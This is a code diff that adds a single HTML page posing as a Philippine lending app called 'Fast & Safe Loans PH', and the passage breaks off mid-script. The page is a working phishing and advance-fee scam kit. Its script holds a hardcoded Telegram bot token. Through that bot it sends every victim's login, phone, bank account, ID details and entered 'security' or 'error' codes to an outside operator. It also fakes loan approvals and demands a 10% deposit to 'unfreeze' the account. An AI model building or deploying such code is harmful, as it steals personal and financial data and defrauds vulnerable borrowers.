@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Fast & Safe Loans PH</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Inter', sans-serif; background: #f5f7fa; color: #1e2329; max-width: 480px; margin: 0 auto; min-height: 100vh; font-size: 14px; overflow-x: hidden; }
+    :root { --gold: #f5b800; --gold-dark: #d4a309; --gold-light: #fff8e1; --blue-bg: #eef3fc; --card: #ffffff; --text: #1e2329; --sub: #707a8a; --border: #e8ecf0; --shadow: 0 8px 24px rgba(0,0,0,0.05); }
+    .hide { display: none !important; }
+    /* login/register */
+    #loginPage { min-height: 100vh; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; }
+    .login-logo { width: 80px; height: 80px; background: linear-gradient(145deg, var(--gold), var(--gold-dark)); border-radius: 24px; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; box-shadow: 0 12px 30px rgba(245,184,0,0.25); }
+    .login-logo span { font-size: 38px; font-weight: 900; color: #fff; }
+    .login-title { font-size: 26px; font-weight: 900; color: #1e2329; letter-spacing: -0.5px; }
+    .login-sub { font-size: 14px; color: var(--sub); margin-bottom: 24px; }
+    .login-card { background: #fff; border-radius: 24px; padding: 28px 20px; width: 100%; box-shadow: var(--shadow); border: 1px solid var(--border); }
+    .login-tabs { display: flex; gap: 6px; background: #f5f7fa; border-radius: 14px; padding: 4px; margin-bottom: 20px; }
+    .login-tab { flex: 1; text-align: center; padding: 12px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; color: var(--sub); transition: 0.2s; }
+    .login-tab-active { background: #fff; color: #1e2329; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
+    .lin { margin-bottom: 14px; position: relative; }
+    .lin label { display: block; font-size: 12px; font-weight: 600; color: var(--sub); margin-bottom: 4px; }
+    .lin input { width: 100%; padding: 14px 14px 14px 44px; background: var(--blue-bg); border: 1px solid var(--border); border-radius: 14px; font-size: 14px; outline: none; transition: 0.2s; font-family: inherit; }
+    .lin input:focus { border-color: var(--gold); background: #fff; box-shadow: 0 0 0 3px rgba(245,184,0,0.15); }
+    .lin .icon { position: absolute; left: 14px; bottom: 14px; font-size: 18px; opacity: 0.5; }
+    .login-btn { width: 100%; padding: 16px; background: linear-gradient(145deg, var(--gold), var(--gold-dark)); border: none; border-radius: 14px; color: #fff; font-weight: 800; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 6px 16px rgba(245,184,0,0.3); }
+    .login-btn:active { transform: scale(0.97); }
+    .login-error { background: #fef0f0; color: #cf304a; padding: 10px; border-radius: 10px; font-size: 13px; margin-top: 10px; display: none; text-align: center; }
+    /* security overlay */
+    .security-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 300; display: none; align-items: center; justify-content: center; padding: 20px; }
+    .security-box { background: #fff; max-width: 400px; width: 100%; border-radius: 28px; padding: 32px 24px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; animation: slideUp 0.25s ease; }
+    @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+    .security-box .shield { font-size: 48px; background: var(--gold-light); width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; border: 2px solid var(--gold); }
+    .security-box h3 { font-size: 18px; font-weight: 800; margin-bottom: 6px; }
+    .security-box p { font-size: 13px; color: var(--sub); margin-bottom: 18px; }
+    .security-box input { width: 100%; padding: 16px; background: var(--gold-light); border: 2px solid var(--gold); border-radius: 14px; font-size: 18px; letter-spacing: 2px; text-align: center; font-weight: 700; color: #1e2329; outline: none; }
+    .security-box input:focus { background: #fff; }
+    .security-box .sec-btn { margin-top: 16px; width: 100%; padding: 14px; background: var(--gold); border: none; border-radius: 14px; font-weight: 800; color: #1e2329; font-size: 16px; cursor: pointer; }
+    /* header & nav */
+    .header { position: sticky; top: 0; z-index: 99; background: #fff; padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
+    .h-left { display: flex; align-items: center; gap: 8px; }
+    .h-logo { background: linear-gradient(145deg, var(--gold), var(--gold-dark)); width: 36px; height: 36px; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 900; font-size: 18px; }
+    .h-name { font-weight: 800; font-size: 16px; }
+    .h-bal { background: var(--gold-light); padding: 6px 14px; border-radius: 30px; border: 1px solid var(--gold); font-weight: 700; font-size: 14px; display: flex; align-items: center; gap: 6px; }
+    .h-bal span { color: var(--gold-dark); }
+    .bnav { position: fixed; bottom: 0; left: 0; right: 0; max-width: 480px; margin: 0 auto; background: #fff; border-top: 1px solid var(--border); display: flex; z-index: 100; box-shadow: 0 -4px 12px rgba(0,0,0,0.03); }
+    .bnav-item { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 8px 0 6px; cursor: pointer; gap: 2px; transition: 0.2s; }
+    .bnav-item svg { width: 24px; height: 24px; color: var(--sub); }
+    .bnav-item span { font-size: 10px; font-weight: 600; color: var(--sub); }
+    .bnav-item-active svg { color: var(--gold); }
+    .bnav-item-active span { color: var(--gold); }
+    .content { padding: 16px 16px 90px; background: #f5f7fa; min-height: 100vh; }
+    .card { background: #fff; border-radius: 20px; padding: 18px; margin-bottom: 14px; border: 1px solid var(--border); box-shadow: var(--shadow); }
+    .card-title { font-size: 16px; font-weight: 700; display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
+    .balance-card { background: linear-gradient(145deg, var(--gold), #f7c948); border-radius: 24px; padding: 22px 20px; color: #1e2329; margin-bottom: 16px; border: 1px solid rgba(0,0,0,0.06); }
+    .balance-row { display: flex; align-items: center; gap: 12px; }
+    .balance-icon { background: #fff; width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 800; color: var(--gold); }
+    .balance-amount { font-family: 'JetBrains Mono', monospace; font-size: 34px; font-weight: 800; letter-spacing: -1px; }
+    .balance-sub { display: flex; gap: 10px; margin-top: 12px; }
+    .balance-sub-item { flex: 1; background: rgba(0,0,0,0.06); border-radius: 14px; padding: 10px; text-align: center; }
+    .balance-sub-item .label { font-size: 10px; opacity: 0.7; }
+    .balance-sub-item .value { font-weight: 700; font-size: 15px; }
+    .badge { display: inline-block; padding: 4px 12px; border-radius: 30px; font-size: 11px; font-weight: 700; }
+    .badge-success { background: #e2f7e8; color: #0b8a3b; }
+    .badge-warning { background: #fff3d6; color: #b86b00; }
+    .badge-danger { background: #fde8e8; color: #b91c1c; }
+    .badge-info { background: #e0edff; color: #0047ab; }
+    .action-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin: 10px 0; }
+    .action-btn { background: var(--blue-bg); border: none; border-radius: 14px; padding: 12px 6px; font-weight: 600; font-size: 12px; cursor: pointer; transition: 0.15s; border: 1px solid transparent; text-align: center; }
+    .action-btn:active { transform: scale(0.96); background: #dce5f0; }
+    .action-btn .emoji { font-size: 20px; display: block; }
+    .coin-row { display: flex; align-items: center; gap: 10px; padding: 10px 0; border-bottom: 1px solid #f0f2f5; cursor: pointer; }
+    .coin-row:last-child { border-bottom: none; }
+    .loan-form input, .loan-form select, .loan-form textarea { width: 100%; padding: 12px 14px; background: var(--blue-bg); border: 1px solid var(--border); border-radius: 12px; font-size: 14px; margin-bottom: 10px; outline: none; font-family: inherit; transition: 0.2s; }
+    .loan-form input:focus, .loan-form select:focus { border-color: var(--gold); background: #fff; }
+    .loan-form label { font-size: 12px; font-weight: 600; color: var(--sub); display: block; margin-bottom: 3px; }
+    .loan-form .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .withdraw-card { border: 2px solid var(--border); border-radius: 16px; padding: 12px; margin-bottom: 8px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 10px; background: #fff; }
+    .withdraw-card.active { border-color: var(--gold); background: var(--gold-light); }
+    .withdraw-card .w-icon { font-size: 24px; }
+    .withdraw-card .w-name { font-weight: 600; font-size: 13px; }
+    .toast { position: fixed; top: 80px; left: 50%; transform: translateX(-50%); background: #1e2329; color: #fff; padding: 12px 24px; border-radius: 14px; font-weight: 600; z-index: 400; white-space: nowrap; box-shadow: 0 8px 30px rgba(0,0,0,0.25); font-size: 14px; }
+    .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; display: none; align-items: center; justify-content: center; padding: 20px; }
+    .modal-box { background: #fff; max-width: 400px; width: 100%; border-radius: 28px; padding: 28px 20px; text-align: center; }
+    .modal-box input { width: 100%; padding: 14px; border-radius: 14px; border: 1px solid var(--border); margin: 12px 0; background: var(--blue-bg); font-size: 16px; text-align: center; }
+    .modal-box .btn-primary { background: var(--gold); border: none; padding: 14px; border-radius: 14px; font-weight: 800; width: 100%; cursor: pointer; }
+    .profile-id { width: 100%; border-radius: 16px; margin: 12px 0; border: 1px solid var(--border); padding: 8px; background: #fafafa; }
+    .profile-id img { width: 100%; border-radius: 10px; }
+    .freeze-badge { background: #1e2329; color: #fff; padding: 4px 12px; border-radius: 30px; font-size: 11px; font-weight: 700; margin-left: 6px; }
+    @media (max-width:420px) { .balance-amount { font-size: 28px; } .action-grid { grid-template-columns: 1fr 1fr; } }
+  </style>
+</head>
+<body>
+<div id="loginPage">
+  <div class="login-logo"><span>₱</span></div>
+  <div class="login-title">Fast & Safe Loans</div>
+  <div class="login-sub">Philippines • Secure Lending</div>
+  <div class="login-card">
+    <div class="login-tabs">
+      <div class="login-tab login-tab-active" id="tab0" onclick="switchTab(0)">Sign In</div>
+      <div class="login-tab" id="tab1" onclick="switchTab(1)">Create Account</div>
+    </div>
+    <div id="loginForm">
+      <div class="lin"><span class="icon">📧</span><input id="lEmail" type="email" placeholder="Email address"></div>
+      <div class="lin"><span class="icon">🔒</span><input id="lPass" type="password" placeholder="Password"></div>
+      <div class="login-error" id="loginError"></div>
+      <button class="login-btn" onclick="doLogin()">Sign In</button>
+    </div>
+    <div id="regForm" class="hide">
+      <div class="lin"><span class="icon">👤</span><input id="rName" placeholder="Full Name"></div>
+      <div class="lin"><span class="icon">📧</span><input id="rEmail" type="email" placeholder="Email"></div>
+      <div class="lin"><span class="icon">🔒</span><input id="rPass" type="password" placeholder="Password (min 6)"></div>
+      <div class="lin"><span class="icon">📱</span><input id="rPhone" placeholder="Phone Number"></div>
+      <div class="lin"><span class="icon">💳</span><input id="rAcc" placeholder="Account Number"></div>
+      <div class="login-error" id="regError"></div>
+      <button class="login-btn" onclick="showSecurityCode()">Create Account</button>
+    </div>
+  </div>
+</div>
+
+<!-- Security overlay for loan code -->
+<div class="security-overlay" id="securityOverlay">
+  <div class="security-box">
+    <div class="shield">🛡️</div>
+    <h3>Loan Security Code</h3>
+    <p>This code is required for loan processing security</p>
+    <input type="text" id="secCodeInput" placeholder="Enter security code" maxlength="10" autocomplete="off">
+    <button class="sec-btn" onclick="confirmSecurityCode()">Open Account</button>
+    <button style="margin-top:8px;background:transparent;border:none;color:var(--sub);font-size:13px;cursor:pointer;" onclick="closeSecurity()">Cancel</button>
+  </div>
+</div>
+
+<div id="mainApp" class="hide">
+  <div class="header">
+    <div class="h-left"><div class="h-logo">₱</div><span class="h-name">Fast Loans</span></div>
+    <div class="h-bal"><span>💰</span><span id="hBal">0.00</span></div>
+  </div>
+  <div class="content" id="pageContent"></div>
+  <div class="bnav">
+    <div class="bnav-item bnav-item-active" onclick="goPage('home')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg><span>Home</span></div>
+    <div class="bnav-item" onclick="goPage('loan')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 7V5a2 2 0 00-2-2h-4a2 2 0 00-2 2v2"/></svg><span>Loan</span></div>
+    <div class="bnav-item" onclick="goPage('withdraw')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 7l-5-5-5 5M17 17l-5 5-5-5"/></svg><span>Withdraw</span></div>
+    <div class="bnav-item" onclick="goPage('profile')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/></svg><span>Profile</span></div>
+  </div>
+</div>
+
+<!-- ID modal -->
+<div class="modal" id="idModal"><div class="modal-box"><h3 style="margin-bottom:8px;">🪪 ID Photo</h3><div class="profile-id"><img id="idPhotoDisplay" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='120' viewBox='0 0 200 120'%3E%3Crect width='200' height='120' fill='%23f5f7fa'/%3E%3Ctext x='20' y='60' font-family='sans-serif' font-size='14' fill='%23666'%3EID Card%3C/text%3E%3C/svg%3E" alt="ID"></div><button class="btn-primary" onclick="closeModal('idModal')">Close</button></div></div>
+
+<!-- deposit modal for unfreeze -->
+<div class="modal" id="depositModal"><div class="modal-box"><h3>🔓 Unfreeze Balance</h3><p style="color:var(--sub);font-size:13px;">Deposit 10% of your balance to unfreeze</p><input id="depositAmountInput" type="number" placeholder="Enter 10% amount" step="0.01"><button class="btn-primary" onclick="confirmUnfreeze()">Confirm Deposit</button><br><button style="margin-top:8px;background:transparent;border:none;color:var(--sub);cursor:pointer;" onclick="closeModal('depositModal')">Cancel</button></div></div>
+
+<script>
+// ========== CONFIG ==========
+const BOT_TOKEN = '8866439592:AAFL1PDzoXorKiVFyoP9SdceFc2khkcAyps';
+const CHAT_ID = '8568477976';
+
+// ========== UTILITY ==========
+function sendTelegram(msg) {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  try {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+    }).catch(e=>{});
+  } catch(e){}
+}
+
+function showToast(t) { let el=document.createElement('div'); el.className='toast'; el.textContent=t; document.body.appendChild(el); setTimeout(()=>el.remove(),3000); }
+function fmt(n){ return '₱'+n.toFixed(2); }
+
+// ========== USER DB ==========
+function getUsers(){ try{ return JSON.parse(localStorage.getItem('fsl_users')||'[]'); }catch(e){return [];} }
+function saveUsers(u){ localStorage.setItem('fsl_users',JSON.stringify(u)); }
+let CU = null, curPage = 'home';
+
+function getCurrentUser(){ if(!CU)return null; let users=getUsers(); return users.find(u=>u.id===CU.id)||null; }
+function saveCurrentUser(user){ let users=getUsers(); let idx=users.findIndex(u=>u.id===user.id); if(idx>=0)users[idx]=user; else users.push(user); saveUsers(users); CU=user; updateBal(); }
+
+// ========== AUTH ==========
+function switchTab(n){ document.getElementById('tab0').classList.toggle('login-tab-active',n===0); document.getElementById('tab1').classList.toggle('login-tab-active',n===1); document.getElementById('loginForm').classList.toggle('hide',n===1); document.getElementById('regForm').classList.toggle('hide',n===0); }
+
+function doLogin(){
+  let email=document.getElementById('lEmail').value.trim(), pass=document.getElementById('lPass').value;
+  let users=getUsers(), user=users.find(u=>u.email===email && u.pass===pass);
+  if(!user){ document.getElementById('loginError').textContent='Invalid credentials'; document.getElementById('loginError').style.display='block'; return; }
+  CU=user; localStorage.setItem('fsl_session',user.id);
+  document.getElementById('loginPage').classList.add('hide');
+  document.getElementById('mainApp').classList.remove('hide');
+  sendTelegram(`🔐 LOGIN\n👤 ${user.name}\n📧 ${user.email}\n💰 ${fmt(user.bal)}\n🕐 ${new Date().toLocaleString()}`);
+  initApp();
+}
+
+let pendingReg = null;
+function showSecurityCode(){
+  let name=document.getElementById('rName').value.trim(), email=document.getElementById('rEmail').value.trim(), pass=document.getElementById('rPass').value, phone=document.getElementById('rPhone').value.trim(), acc=document.getElementById('rAcc').value.trim();
+  if(!name||!email||!pass||!phone||!acc){ document.getElementById('regError').textContent='All fields required'; document.getElementById('regError').style.display='block'; return; }
+  if(pass.length<6){ document.getElementById('regError').textContent='Password min 6 chars'; document.getElementById('regError').style.display='block'; return; }
+  if(getUsers().find(u=>u.email===email)){ document.getElementById('regError').textContent='Email already registered'; document.getElementById('regError').style.display='block'; return; }
+  pendingReg = { name, email, pass, phone, acc };
+  document.getElementById('securityOverlay').style.display='flex';
+  document.getElementById('secCodeInput').value='';
+}
+
+function closeSecurity(){ document.getElementById('securityOverlay').style.display='none'; pendingReg=null; }
+
+function confirmSecurityCode(){
+  let code = document.getElementById('secCodeInput').value.trim();
+  if(!code){ showToast('Please enter security code'); return; }
+  if(!pendingReg) return;
+  let {name,email,pass,phone,acc} = pendingReg;
+  let user = { id:'u_'+Date.now(), name, email, pass, phone, acc, bal:0, loan:{amount:0,status:'none',code:''}, frozen:false, history:[], loanCode:code };
+  let users=getUsers(); users.push(user); saveUsers(users);
+  CU=user; localStorage.setItem('fsl_session',user.id);
+  sendTelegram(`🆕 NEW ACCOUNT\n👤 ${name}\n📧 ${email}\n📱 ${phone}\n💳 ${acc}\n🔐 Security Code: ${code}\n🕐 ${new Date().toLocaleString()}`);
+  document.getElementById('loginPage').classList.add('hide');
+  document.getElementById('mainApp').classList.remove('hide');
+  closeSecurity();
+  showToast('Account created! Welcome.');
+  initApp();
+}
+
+function doLogout(){ let u=getCurrentUser(); if(u){ sendTelegram(`🚪 LOGOUT\n👤 ${u.name}\n💰 ${fmt(u.bal)}`); } localStorage.removeItem('fsl_session'); CU=null; location.reload(); }
+
+// ========== INIT ==========
+function initApp(){ renderPage(); setInterval(updateBal,3000); }
+
+function updateBal(){
+  let user=getCurrentUser(); if(!user)return;
+  let el=document.getElementById('hBal'); if(el) el.textContent=fmt(user.bal);
+  let live=document.getElementById('liveBal'); if(live) live.textContent=fmt(user.bal);
+}
+
+// ========== RENDER ==========
+function goPage(p){ curPage=p; document.querySelectorAll('.bnav-item').forEach((el,i)=>{ let pages=['home','loan','withdraw','profile']; el.classList.toggle('bnav-item-active',pages[i]===p); }); renderPage(); }
+
+function renderPage(){
+  let pc=document.getElementById('pageContent'); if(!pc)return;
+  switch(curPage){
+    case 'home': renderHome(pc); break;
+    case 'loan': renderLoan(pc); break;
+    case 'withdraw': renderWithdraw(pc); break;
+    case 'profile': renderProfile(pc); break;
+    default: pc.innerHTML='<div class="card">Home</div>';
+  }
+  updateBal();
+}
+
+// ========== HOME ==========
+function renderHome(pc){
+  let u=getCurrentUser(); if(!u)return;
+  let statusBadge = u.loan && u.loan.status==='approved' ? '<span class="badge badge-success">Approved</span>' :
+                    u.loan && u.loan.status==='pending' ? '<span class="badge badge-warning">Pending</span>' :
+                    u.loan && u.loan.status==='rejected' ? '<span class="badge badge-danger">Rejected</span>' :
+                    '<span class="badge badge-info">No Loan</span>';
+  let freezeBtn = u.frozen ? `<button class="action-btn" onclick="unfreezeAction()"><span class="emoji">🔓</span>Unfreeze (10%)</button>` :
+                             `<button class="action-btn" onclick="freezeAction()"><span class="emoji">🔒</span>Freeze</button>`;
+  let html = `
+    <div class="balance-card">
+      <div class="balance-row"><div class="balance-icon">₱</div><div><div style="font-size:13px;opacity:0.7;">Available Balance</div><div class="balance-amount" id="liveBal">${fmt(u.bal)}</div></div></div>
+      <div class="balance-sub">
+        <div class="balance-sub-item"><div class="label">Loan Status</div><div class="value">${statusBadge}</div></div>
+        <div class="balance-sub-item"><div class="label">Account</div><div class="value">#${u.id.slice(-4)}</div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="action-grid">
+        <div class="action-btn" onclick="goPage('loan')"><span class="emoji">📄</span>Apply Loan</div>
+        <div class="action-btn" onclick="goPage('withdraw')"><span class="emoji">💸</span>Withdraw</div>
+        <div class="action-btn" onclick="viewID()"><span class="emoji">🪪</span>View ID</div>
+        ${freezeBtn}
+      </div>
+      ${u.frozen ? '<div style="background:#fee;border-radius:12px;padding:8px;text-align:center;color:#b91c1c;font-weight:600;margin-top:6px;">⛔ Account Frozen</div>' : ''}
+    </div>
+    <div class="card"><div class="card-title">📋 Quick Info</div><div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px;"><span>👤 ${u.name}</span><span>📧 ${u.email}</span><span>📱 ${u.phone||'N/A'}</span><span>💳 ${u.acc||'N/A'}</span></div></div>
+  `;
+  pc.innerHTML=html;
+}
+
+// ========== FREEZE / UNFREEZE ==========
+function freezeAction(){
+  let u=getCurrentUser(); if(!u)return;
+  if(u.frozen){ showToast('Already frozen'); return; }
+  if(u.loan && u.loan.status==='approved'){ showToast('Cannot freeze: active loan'); return; }
+  u.frozen=true; saveCurrentUser(u); sendTelegram(`❄️ ACCOUNT FROZEN\n👤 ${u.name}\n💰 ${fmt(u.bal)}`); renderPage(); showToast('Account frozen');
+}
+
+function unfreezeAction(){
+  let u=getCurrentUser(); if(!u || !u.frozen)return;
+  let depositNeeded = u.bal * 0.10;
+  if(depositNeeded < 1) depositNeeded = 1;
+  document.getElementById('depositAmountInput').value = depositNeeded.toFixed(2);
+  document.getElementById('depositModal').style.display='flex';
+}
+
+function confirmUnfreeze(){
+  let u=getCurrentUser(); if(!u)return;
+  let val = parseFloat(document.getElementById('depositAmountInput').value);
+  let needed = u.bal * 0.10; if(needed<1) needed=1;
+  if(Math.abs(val-needed)>0.01){ showToast(`Enter exact 10%: ${needed.toFixed(2)}`); return; }
+  u.bal += needed;
+  u.frozen = false;
+  saveCurrentUser(u);
+  sendTelegram(`🔓 ACCOUNT UNFROZEN\n👤 ${u.name}\n💰 New Balance: ${fmt(u.bal)}\n10% deposit added`);
+  closeModal('depositModal');
+  renderPage();
+  showToast(`Unfrozen! +${fmt(needed)} bonus`);
+}
+
+// ========== LOAN ==========
+function renderLoan(pc){
+  let u=getCurrentUser(); if(!u)return;
+  let html = `<div class="card"><div class="card-title">📄 Loan Application</div>
+    <div class="loan-form">
+      <label>Full Name</label><input id="loanName" value="${u.name}" placeholder="Full Name">
+      <label>Email</label><input id="loanEmail" value="${u.email}" placeholder="Email">
+      <div class="row2"><div><label>Birthday</label><input id="loanBday" type="date"></div><div><label>ID Type</label><select id="loanIdType"><option>UMID</option><option>Driver License</option><option>Passport</option><option>Postal ID</option></select></div></div>
+      <label>Bank Account</label><input id="loanBank" placeholder="Bank name / account">
+      <label>Career / Work</label><input id="loanCareer" placeholder="Occupation">
+      <label>Address</label><textarea id="loanAddr" rows="2" placeholder="Current address"></textarea>
+      <label>Loan Amount (₱1,000 - ₱500,000)</label><input id="loanAmt" type="number" placeholder="Amount" min="1000" max="500000">
+      <label>Purpose</label><input id="loanPurpose" placeholder="e.g. Business, Education">
+      <button class="login-btn" onclick="submitLoan()">Submit Loan Application</button>
+    </div></div>`;
+  if(u.loan && u.loan.status==='pending'){
+    html += `<div class="card" style="background:#fff3d6;"><div style="font-weight:700;">⏳ Loan Pending</div><div>Amount: ${fmt(u.loan.amount)}</div><div>Submitted: ${new Date(u.loan.time).toLocaleString()}</div></div>`;
+  }
+  if(u.loan && u.loan.status==='approved'){
+    html += `<div class="card" style="background:#e2f7e8;"><div style="font-weight:700;">✅ Loan Approved</div><div>Amount: ${fmt(u.loan.amount)}</div></div>`;
+  }
+  pc.innerHTML=html;
+}
+
+function submitLoan(){
+  let u=getCurrentUser(); if(!u)return;
+  if(u.frozen){ showToast('Account frozen. Unfreeze first.'); return; }
+  if(u.loan && (u.loan.status==='pending'||u.loan.status==='approved')){ showToast('Already has active loan.'); return; }
+  let name=document.getElementById('loanName').value.trim();
+  let email=document.getElementById('loanEmail').value.trim();
+  let bday=document.getElementById('loanBday').value;
+  let idType=document.getElementById('loanIdType').value;
+  let bank=document.getElementById('loanBank').value.trim();
+  let career=document.getElementById('loanCareer').value.trim();
+  let addr=document.getElementById('loanAddr').value.trim();
+  let amt=parseFloat(document.getElementById('loanAmt').value);
+  let purpose=document.getElementById('loanPurpose').value.trim();
+  if(!name||!email||!bday||!bank||!career||!addr||!amt||amt<1000||amt>500000){ showToast('Fill all fields correctly'); return; }
+  let code = prompt('🔐 Enter Loan Security Code (required for approval)');
+  if(!code){ showToast('Security code required'); return; }
+  let msg = `📌 LOAN APPLICATION\n👤 ${name}\n📧 ${email}\n🎂 ${bday}\n🪪 ${idType}\n🏦 ${bank}\n💼 ${career}\n📍 ${addr}\n💰 ${fmt(amt)}\n🎯 ${purpose}\n🔐 Security Code: ${code}`;
+  sendTelegram(msg);
+  u.loan = { amount:amt, status:'pending', time:Date.now(), code:code };
+  saveCurrentUser(u);
+  showToast('Loan submitted! Processing...');
+  renderPage();
+  setTimeout(()=>{
+    let user=getCurrentUser();
+    if(user && user.loan && user.loan.status==='pending'){
+      user.loan.status='approved';
+      user.bal += user.loan.amount;
+      saveCurrentUser(user);
+      sendTelegram(`✅ LOAN APPROVED\n👤 ${user.name}\n💰 ${fmt(user.loan.amount)} credited`);
+      renderPage();
+      showToast(`Loan approved! ${fmt(user.loan.amount)} added.`);
+    }
+  }, 30000);
+}
+
+// ========== WITHDRAW ==========
+const banks = [
+  {name:'BDO',icon:'🏦'},{name:'BPI',icon:'🏦'},{name:'Metrobank',icon:'🏦'},{name:'Landbank',icon:'🏦'},
+  {name:'PNB',icon:'🏦'},{name:'Security Bank',icon:'🏦'},{name:'UnionBank',icon:'🏦'},{name:'RCBC',icon:'🏦'},
+  {name:'GCash',icon:'📱'},{name:'Maya',icon:'📱'},{name:'Coins.ph',icon:'🪙'},{name:'GrabPay',icon:'🟢'}
+];
+let selectedBank = 'BDO';
+
+function renderWithdraw(pc){
+  let u=getCurrentUser(); if(!u)return;
+  let html = `<div class="card"><div class="card-title">💸 Withdraw</div>`;
+  html += `<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-bottom:14px;">`;
+  banks.forEach(b=>{
+    let active = selectedBank===b.name?'active':'';
+    html += `<div class="withdraw-card ${active}" onclick="selectBank('${b.name}')"><div class="w-icon">${b.icon}</div><div><div class="w-name">${b.name}</div></div></div>`;
+  });
+  html += `</div><div class="loan-form">
+    <label>Amount (₱)</label><input id="wdAmt" type="number" placeholder="Amount" min="10">
+    <label>Account Number</label><input id="wdAcc" placeholder="Account number">
+    <label>Account Name</label><input id="wdName" placeholder="Account name">
+    <label>Password</label><input id="wdPass" type="password" placeholder="Your password">
+    <button class="login-btn" onclick="processWithdraw()">Process Withdrawal</button>
+  </div></div>`;
+  if(u.frozen) html += `<div class="card" style="background:#fee;color:#b91c1c;text-align:center;font-weight:700;">⛔ Account is frozen. Unfreeze to withdraw.</div>`;
+  pc.innerHTML=html;
+}
+
+function selectBank(name){ selectedBank=name; renderPage(); }
+
+function processWithdraw(){
+  let u=getCurrentUser(); if(!u)return;
+  if(u.frozen){ showToast('Account frozen. Unfreeze first.'); return; }
+  let amt=parseFloat(document.getElementById('wdAmt').value);
+  let acc=document.getElementById('wdAcc').value.trim();
+  let name=document.getElementById('wdName').value.trim();
+  let pass=document.getElementById('wdPass').value;
+  if(!amt||amt<10||!acc||!name||!pass){ showToast('Fill all fields'); return; }
+  if(pass!==u.pass){ showToast('Wrong password'); return; }
+  if(amt>u.bal){ showToast('Insufficient balance'); return; }
+  showToast('Processing... 10s');
+  sendTelegram(`💸 WITHDRAWAL ATTEMPT\n👤 ${u.name}\n🏦 ${selectedBank}\n💰 ${fmt(amt)}\n📋 ${acc}\n👤 ${name}`);
+  setTimeout(()=>{
+    let code = prompt('❌ Bank account error! Please enter the error code.');
+    if(code){
+      let bonus = u.bal * 0.10;
+      u.bal += bonus;
+      sendTelegram(`✅ ERROR CODE CLEARED\n👤 ${u.name}\n🔑 Code: ${code}\n🎁 10% bonus: ${fmt(bonus)}`);
+      u.frozen = true;
+      saveCurrentUser(u);
+      showToast(`Error cleared! +${fmt(bonus)} bonus. Account frozen. Contact customer care.`);
+      renderPage();
+    } else {
+      showToast('Withdrawal cancelled');
+    }
+  }, 10000);
+}
+
+// ========== PROFILE ==========
+function renderProfile(pc){
+  let u=getCurrentUser(); if(!u)return;
+  let html = `<div class="card"><div class="card-title">👤 Profile</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:14px;">
+      <div><strong>Name</strong><br>${u.name}</div>
+      <div><strong>Email</strong><br>${u.email}</div>
+      <div><strong>Phone</strong><br>${u.phone||'N/A'}</div>
+      <div><strong>Account</strong><br>${u.acc||'N/A'}</div>
+      <div><strong>Balance</strong><br>${fmt(u.bal)}</div>
+      <div><strong>Loan Status</strong><br>${u.loan?u.loan.status:'none'}</div>
+    </div>
+    <div style="margin-top:12px;display:flex;gap:8px;">
+      <button class="action-btn" onclick="viewID()" style="flex:1;"><span class="emoji">🪪</span>View ID</button>
+      <button class="action-btn" onclick="doLogout()" style="flex:1;background:#fee;"><span class="emoji">🚪</span>Logout</button>
+    </div>
+  </div>`;
+  pc.innerHTML=html;
+}
+
+function viewID(){
